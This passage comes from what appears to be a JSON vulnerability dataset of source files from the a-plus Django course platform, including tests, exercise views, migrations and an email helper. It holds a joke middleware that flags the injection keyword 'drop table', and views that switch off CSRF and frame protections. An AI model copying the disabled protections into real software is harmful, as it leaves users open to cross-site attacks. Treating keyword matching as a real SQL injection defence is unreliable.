max_points=50,\n            points_to_pass=50,\n            max_submissions=0,\n            service_url=\"http://nowhere.asdasfasf/testServiceURL\",\n        )\n        png = b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x05\\x08\\x02\\x00\\x00\\x00\\x02\\r\\xb1\\xb2\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x15IDAT\\x08\\xd7c`\\xc0\\n\\xfe\\xff\\xff\\x8f\\xce\\xc1\"\\x84\\x05\\x00\\x00\\xde\\x7f\\x0b\\xf5<|+\\x98\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82'\n        file_a = os.path.join(settings.MEDIA_ROOT, \"test.png\")\n        file_b = os.path.join(settings.MEDIA_ROOT, \"test.py\")\n        with open(file_a, \"wb\") as f:\n            f.write(png)\n        with open(file_b, \"wb\") as f:\n            f.write(\"Tekijt ja Hyypp\".encode(\"latin1\"))\n\n        self.course_instance.enroll_student(self.user)\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n\n        with open(file_a, \"rb\") as fa:\n            with open(file_b, \"rb\") as fb:\n                response = self.client.post(exercise.get_absolute_url(), {\n                    \"key\": \"value\",\n                    \"file1\": fa,\n                    \"file2\": fb,\n                })\n        self.assertEqual(response.status_code, 302)\n\n        subs = self.user.userprofile.submissions.filter(exercise=exercise.id)\n        self.assertEqual(subs.count(), 1)\n        sub = subs.first()\n\n        self.assertEqual(sub.submission_data[0], [\"key\", \"value\"])\n        self.assertEqual(sub.files.count(), 2)\n        files = sub.files.all().order_by(\"param_name\")\n\n        self.assertEqual(files[0].param_name, \"file1\")\n        response = self.client.get(files[0].get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], \"image/png\")\n\n        self.assertEqual(files[1].param_name, \"file2\")\n        response = self.client.get(files[1].get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], 'text/plain; charset=\"UTF-8\"')\n\n        response = self.client.get(files[1].get_absolute_url() + \"?download=1\")\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response[\"Content-Type\"], \"application/octet-stream\")\n        self.assertTrue(response[\"Content-Disposition\"].startswith(\"attachment; filename=\"))\n\n        exercise.delete()\n\n    def test_can_show_model_solutions(self):\n        course_module_with_late_submissions_open = CourseModule.objects.create(\n            name=\"test module late open\",\n            url=\"test-module-late-open\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday - timedelta(days=1),\n            closing_time=self.yesterday,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.tomorrow,\n            late_submission_penalty=0.4,\n        )\n        course_module_with_late_submissions_closed = CourseModule.objects.create(\n            name=\"test module late closed\",\n            url=\"test-module-late-closed\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday - timedelta(days=1),\n            closing_time=self.yesterday,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.today - timedelta(hours=1),\n            late_submission_penalty=0.4,\n        )\n        base_exercise_with_late_open = BaseExercise.objects.create(\n            name=\"test exercise late open\",\n            course_module=course_module_with_late_submissions_open,\n            category=self.learning_object_category,\n            url=\"blateopen\",\n            max_submissions=5,\n        )\n        base_exercise_with_late_closed = BaseExercise.objects.create(\n            name=\"test exercise late closed\",\n            course_module=course_module_with_late_submissions_closed,\n            category=self.learning_object_category,\n            url=\"blateclosed\",\n            max_submissions=5,\n        )\n\n        self.assertFalse(self.base_exercise.can_show_model_solutions) # module is open\n        self.assertFalse(self.base_exercise.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions) # module is open\n        self.assertFalse(self.base_exercise_with_late_submission_allowed.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions)\n        self.assertFalse(base_exercise_with_late_open.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n\n        # The user has submitted alone and has no deadline extension.\n        self.assertEqual(self.old_base_exercise.get_submissions_for_student(self.user.userprofile).count(), 0)\n        submission1 = Submission.objects.create(\n            exercise=self.old_base_exercise,\n        )\n        submission1.submitters.add(self.user.userprofile)\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions) # module is closed\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        # Add a deadline extension that is still active.\n        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=1440, # One day\n        )\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions)\n        self.assertFalse(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n        # Change the deadline extension so that it is not active anymore.\n        self.old_course_module.closing_time = self.today - timedelta(hours=2)\n        self.old_course_module.save()\n        deadline_rule_deviation_old_base_exercise.delete()\n        deadline_rule_deviation_old_base_exercise = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=10,\n        )\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions)\n        self.assertTrue(self.old_base_exercise.can_show_model_solutions_to_student(self.user))\n\n        # Group submission\n        submission2 = Submission.objects.create(\n            exercise=base_exercise_with_late_closed,\n        )\n        submission2.submitters.add(self.user.userprofile, self.user2.userprofile)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n        # Add a deadline extension to one group member. It affects all group members.\n        # Note: deadline deviations are relative to the module closing time, not the late submission deadline.\n        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(\n            exercise=base_exercise_with_late_closed,\n            submitter=self.user.userprofile,\n            extra_minutes=60*24*2,\n        )\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertFalse(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n        # Change the deadline extension so that it is not active anymore.\n        deadline_rule_deviation_ex_late_closed.delete()\n        deadline_rule_deviation_ex_late_closed = DeadlineRuleDeviation.objects.create(\n            exercise=base_exercise_with_late_closed,\n            submitter=self.user.userprofile,\n            extra_minutes=10,\n        )\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions)\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user))\n        self.assertTrue(base_exercise_with_late_closed.can_show_model_solutions_to_student(self.user2))\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/views.py",
        "source": "from django.conf import settings\nfrom django.contrib import messages\nfrom django.core.exceptions import MultipleObjectsReturned, PermissionDenied\nfrom django.http.response import Http404, HttpResponse\nfrom django.shortcuts import get_object_or_404\nfrom django.utils.decorators import method_decorator\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.views.decorators.clickjacking import xframe_options_exempt\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.views.static import serve\n\nfrom authorization.permissions import ACCESS\nfrom course.models import CourseModule\nfrom course.viewbase import CourseInstanceBaseView, EnrollableViewMixin\nfrom lib.remote_page import RemotePageNotFound, request_for_response\nfrom lib.viewbase import BaseRedirectMixin, BaseView\nfrom .models import LearningObject, LearningObjectDisplay\nfrom .protocol.exercise_page import ExercisePage\nfrom .submission_models import SubmittedFile, Submission\nfrom .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView\n\nfrom .exercisecollection_models import ExerciseCollection\nfrom .exercise_summary import UserExerciseSummary\nfrom django.urls import reverse\n\n\nclass TableOfContentsView(CourseInstanceBaseView):\n    template_name = \"exercise/toc.html\"\n\n\nclass ResultsView(TableOfContentsView):\n    template_name = \"exercise/results.html\"\n\n\nclass ExerciseInfoView(ExerciseBaseView):\n    ajax_template_name = \"exercise/_exercise_info.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n\n\nclass ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):\n    template_name = \"exercise/exercise.html\"\n    ajax_template_name = \"exercise/exercise_plain.html\"\n    post_url_name = \"exercise\"\n    access_mode = ACCESS.STUDENT\n\n    # Allow form posts without the cross-site-request-forgery key.\n    @method_decorator(csrf_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n    def get_access_mode(self):\n        access_mode = super().get_access_mode()\n\n        # Loosen the access mode if exercise is enrollment\n        if (self.exercise.status in (\n                LearningObject.STATUS.ENROLLMENT,\n                LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n              ) and access_mode == ACCESS.STUDENT):\n            access_mode = ACCESS.ENROLL\n\n        return access_mode\n\n    def get(self, request, *args, **kwargs):\n        exercisecollection = None\n        exercisecollection_title = None\n        submission_allowed = False\n        disable_submit = False\n        should_enroll = False\n        issues = []\n        students = [self.profile]\n\n        if self.exercise.is_submittable:\n            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS\n            submission_status, submission_allowed, issues, students = self.submission_check()\n            self.get_summary_submissions()\n            disable_submit = submission_status in [\n                SUBMIT_STATUS.CANNOT_ENROLL,\n                SUBMIT_STATUS.NOT_ENROLLED,\n            ]\n            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED\n\n        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE\n              or self.module.status == CourseModule.STATUS.MAINTENANCE):\n            if self.is_course_staff:\n                issue = _(\"Exercise is in maintenance and content is hidden \"\n                          \"from students.\")\n                messages.error(request, issue)\n                issues.append(issue)\n            else:\n                page = ExercisePage(self.exercise)\n                page.content = _('Unfortunately this exercise is currently '\n                                 'under maintenance.')\n                return super().get(request, *args, page=page, students=students, **kwargs)\n\n        if hasattr(self.exercise, 'generate_table_of_contents') \\\n              and self.exercise.generate_table_of_contents:\n            self.toc = self.content.children_hierarchy(self.exercise)\n            self.note(\"toc\")\n\n        page = self.exercise.as_leaf_class().load(request, students,\n            url_name=self.post_url_name)\n\n        if self.profile:\n            LearningObjectDisplay.objects.create(learning_object=self.exercise, profile=self.profile)\n\n        if isinstance(self.exercise, ExerciseCollection):\n            exercisecollection, exercisecollection_title = self.__load_exercisecollection(request)\n\n        return super().get(request,\n                           *args,\n                           page=page,\n                           students=students,\n                           submission_allowed=submission_allowed,\n                           disable_submit=disable_submit,\n                           should_enroll=should_enroll,\n                           issues=issues,\n                           exercisecollection=exercisecollection,\n                           exercisecollection_title=exercisecollection_title,\n                           **kwargs)\n\n    def post(self, request, *args, **kwargs):\n        # Stop submit trials for e.g. chapters.\n        # However, allow posts from exercises switched to maintenance status.\n        if not self.exercise.is_submittable:\n            return self.http_method_not_allowed(request, *args, **kwargs)\n\n        new_submission = None\n        page = ExercisePage(self.exercise)\n        submission_status, submission_allowed, issues, students = (\n            self.submission_check(True, request)\n        )\n        if submission_allowed:\n            new_submission = Submission.objects.create_from_post(\n                self.exercise, students, request)\n            if new_submission:\n                page = self.exercise.grade(request, new_submission,\n                    url_name=self.post_url_name)\n\n                # Enroll after succesfull enrollment exercise.\n                if self.exercise.status in (\n                    LearningObject.STATUS.ENROLLMENT,\n                    LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n                ) and new_submission.status == Submission.STATUS.READY:\n                    self.instance.enroll_student(self.request.user)\n\n                # Redirect non AJAX normally to submission page.\n                if not request.is_ajax() and \"__r\" not in request.GET:\n                    return self.redirect(new_submission.get_absolute_url() +\n                        (\"?wait=1\" if page.is_wait else \"\"))\n            else:\n                messages.error(request,\n                    _(\"The submission could not be saved for some reason. \"\n                      \"The submission was not registered.\"))\n\n            # Redirect non AJAX content page request back.\n            if not request.is_ajax() and \"__r\" in request.GET:\n                return self.redirect(request.GET[\"__r\"], backup=self.exercise);\n\n        self.get_summary_submissions()\n        return self.response(page=page, students=students,\n            submission=new_submission)\n\n    def submission_check(self, error=False, request=None):\n        if not self.profile:\n            issue = _(\"You need to sign in and enroll to submit exercises.\")\n            messages.error(self.request, issue)\n            return self.exercise.SUBMIT_STATUS.INVALID, False, [issue], []\n        submission_status, issues, students = (\n            self.exercise.check_submission_allowed(self.profile, request)\n        )\n        if len(issues) > 0:\n            if error:\n                messages.error(self.request, \"\\n\".join(issues))\n            else:\n                messages.warning(self.request, \"\\n\".join(issues))\n        submission_allowed = (\n            submission_status == self.exercise.SUBMIT_STATUS.ALLOWED\n        )\n        return submission_status, submission_allowed, issues, students\n\n\n    def __load_exercisecollection(self, request):\n        user = self.profile.user\n\n        if user.is_authenticated():\n            self.exercise.check_submission(user, no_update=True)\n\n        target_exercises = []\n        for t_exercise in self.exercise.exercises:\n            it = t_exercise.parent\n            ex_url = it.url\n            it = it.parent\n            while it is not None:\n                ex_url = it.url + '/' + ex_url\n                it = it.parent\n\n            ex_name = t_exercise.name\n            for candidate in t_exercise.name.split('|'):\n                if request.LANGUAGE_CODE in candidate:\n                    ex_name = candidate[len('{}:'.format(request.LANGUAGE_CODE)):]\n\n            data = {\"exercise\": t_exercise,\n                    \"url\": reverse(\"exercise\", kwargs={\n                        \"course_slug\": t_exercise.course_module.course_instance.course.url,\n                        \"instance_slug\": t_exercise.course_module.course_instance.url,\n                        \"module_slug\": t_exercise.course_module.url,\n                        \"exercise_path\": ex_url,\n                    }),\n                    \"title\": ex_name,\n                    \"max_points\": t_exercise.max_points,\n                    \"user_points\": UserExerciseSummary(t_exercise, request.user).get_points(),\n                    }\n            target_exercises.append(data)\n\n        title = \"{}: {} - {}\".format(t_exercise.course_module.course_instance.course.name,\n                                     t_exercise.course_module.course_instance.instance_name,\n                                     t_exercise.category.name)\n\n        return target_exercises, title\n\n\nclass ExercisePlainView(ExerciseView):\n    raise_exception=True\n    force_ajax_template=True\n    post_url_name=\"exercise-plain\"\n\n    # Allow form posts without the cross-site-request-forgery key.\n    # Allow iframe in another domain.\n    @method_decorator(csrf_exempt)\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass ExerciseModelView(ExerciseModelBaseView):\n    template_name = \"exercise/model.html\"\n    ajax_template_name = \"exercise/_model_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.models = []\n        for url,name in self.exercise.get_models():\n            try:\n                response = request_for_response(url)\n            except RemotePageNotFound:\n                self.models.append({'name': name})\n            else:\n                self.models.append({\n                    'name': name,\n                    'content': response.text,\n                    'html': 'text/html' in response.headers.get('Content-Type'),\n                })\n        self.note('models')\n\n\nclass ExerciseTemplateView(ExerciseTemplateBaseView):\n    template_name = \"exercise/template.html\"\n    ajax_template_name = \"exercise/_template_files.html\"\n    access_mode = ACCESS.ENROLLED\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n        self.templates = []\n        for url,name in self.exercise.get_templates():\n            response = request_for_response(url)\n            self.templates.append({\n                'name': name,\n                'content': response.text,\n                'html': 'text/html' in response.headers.get('Content-Type'),\n            })\n        self.note('templates')\n\n\nclass SubmissionView(SubmissionBaseView):\n    template_name = \"exercise/submission.html\"\n    ajax_template_name = \"exercise/submission_plain.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.page = { \"is_wait\": \"wait\" in self.request.GET }\n        self.note(\"page\")\n        #if not self.request.is_ajax():\n        self.get_summary_submissions()\n\n\nclass SubmissionPlainView(SubmissionView):\n    raise_exception=True\n    force_ajax_template=True\n\n    # Allow iframe in another domain.\n    @method_decorator(xframe_options_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n\nclass SubmissionPollView(SubmissionMixin, BaseView):\n\n    def get(self, request, *args, **kwargs):\n        return HttpResponse(self.submission.status, content_type=\"text/plain\")\n\n\nclass SubmittedFileView(SubmissionMixin, BaseView):\n    file_kw = \"file_id\"\n    file_name_kw = \"file_name\"\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        file_id = self._get_kwarg(self.file_kw)\n        file_name = self._get_kwarg(self.file_name_kw)\n        self.file = get_object_or_404(\n            SubmittedFile,\n            id=file_id,\n            submission=self.submission\n        )\n        if self.file.filename != file_name:\n            raise Http404()\n\n    def get(self, request, *args, **kwargs):\n        with open(self.file.file_object.path, \"rb\") as f:\n            bytedata = f.read()\n\n        # Download the file.\n        if request.GET.get(\"download\", False):\n            response = HttpResponse(bytedata,\n                content_type=\"application/octet-stream\")\n            response[\"Content-Disposition\"] = 'attachment; filename=\"{}\"'\\\n                .format(self.file.filename)\n            return response\n\n        if self.file.is_passed():\n            return HttpResponse(bytedata, content_type=self.file.get_mime())\n\n        return HttpResponse(bytedata.decode('utf-8', 'ignore'),\n            content_type='text/plain; charset=\"UTF-8\"')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/external_services/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('inheritance', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LinkService',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('url', models.CharField(help_text=b'The service URL', max_length=256)),\n                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),\n                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),\n                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),\n            ],\n            options={\n                'ordering': ['menu_label'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='LTIService',\n            fields=[\n                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService')),\n                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),\n                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),\n            ],\n            options={\n            },\n            bases=('external_services.linkservice',),\n        ),\n        migrations.CreateModel(\n            name='MenuItem',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),\n                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),\n                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),\n                ('enabled', models.BooleanField(default=True)),\n                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.')),\n                ('service', models.ForeignKey(to='external_services.LinkService')),\n            ],\n            options={\n                'ordering': ['course_instance', 'menu_weight', 'menu_label'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/external_services/migrations/0002_auto_20150427_1717.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='linkservice',\n            name='enabled',\n            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_icon_class',\n            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_label',\n            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='url',\n            field=models.CharField(help_text='The service URL', max_length=256),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_key',\n            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_secret',\n            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_weight',\n            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/external_services/migrations/0005_auto_20160829_1344.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_group_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_url',\n            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='service',\n            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/inheritance/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='ModelWithInheritance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/lib/email_messages.py",
        "source": "import logging\nimport traceback\nfrom django.conf import settings\nfrom django.core.mail import send_mail\nfrom django.core.urlresolvers import reverse\n\nlogger = logging.getLogger('lib.email_messages')\n\n\ndef email_course_error(request, exercise, message, exception=True):\n    \"\"\"\n    Sends error message to course teachers or technical support emails if set.\n    \"\"\"\n    instance = exercise.course_instance\n    if instance.technical_error_emails:\n        recipients = instance.technical_error_emails.split(\",\")\n    else:\n        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)\n\n    error_trace = \"-\"\n    if exception:\n        error_trace = traceback.format_exc()\n\n    subject = settings.EXERCISE_ERROR_SUBJECT.format(\n        course=instance.course.code,\n        exercise=str(exercise))\n    body = settings.EXERCISE_ERROR_DESCRIPTION.format(\n        message=message,\n        exercise_url=request.build_absolute_uri(\n            exercise.get_absolute_url()),\n        course_edit_url=request.build_absolute_uri(\n            instance.get_url('course-details')),\n        error_trace=error_trace,\n        request_fields=repr(request))\n    if recipients:\n        try:\n            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)\n        except Exception as e:\n            logger.exception('Failed to send error emails.')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/lib/middleware.py",
        "source": "\"\"\"\nThis middleware is an easter egg! It is invoked when any request parameters\ncontain the string \"drop table\" (a potential SQL injection) and prevents the\nuser from loading any pages. Instead, a response with internal server error code\nis returned with a \"funny\" error message. The SQL injection attempt is stored in\nthe session, so that the problem persists even if the user reloads the page.\nOther users and the actual system are not affected by this middleware.\n\nThe normal behavior can be restored by giving any request parameter value with the\nstring \"restore table\" in it.\n\"\"\"\n\nfrom django.http import HttpResponseServerError\n\nclass SqlInjectionMiddleware(object):\n\n    def process_request(self, request):\n        for var in request.GET:\n            val = request.GET.get(var).lower()\n            if \"drop table\" in val:\n                request.session[\"hack_attempt\"] = val\n            if \"restore table\" in val and \"hack_attempt\" in request.session:\n                del request.session[\"hack_attempt\"]\n\n        if \"hack_attempt\" in request.session:\n            return HttpResponseServerError(\"Traceback (most recent call last):\\nFile \\\"egg.py\\\", line 1337, in aplus\\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier\", content_type=\"text/plain\")\n\n        return None\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/news/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='News',\n            fields=[\n                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),\n                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),\n                ('publish', models.DateTimeField(default=django.utils.timezone.now)),\n                ('title', models.CharField(max_length=255)),\n                ('body', models.TextField()),\n                ('pin', models.BooleanField(default=False)),\n                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news')),\n            ],\n            options={\n                'ordering': ['course_instance', '-pin', '-publish'],\n            },\n            bases=(models.Model, lib.models.UrlMixin),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/news/templatetags/news.py",
